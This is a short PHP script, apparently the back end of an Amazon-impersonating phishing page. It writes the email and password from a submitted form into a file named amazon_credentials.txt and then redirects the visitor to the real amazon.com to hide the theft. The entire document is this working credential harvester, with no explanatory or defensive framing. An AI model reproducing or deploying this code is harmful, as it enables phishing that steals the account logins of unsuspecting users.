<?php

file_put_contents("credentials/amazon_credentials.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.amazon.com');
exit();
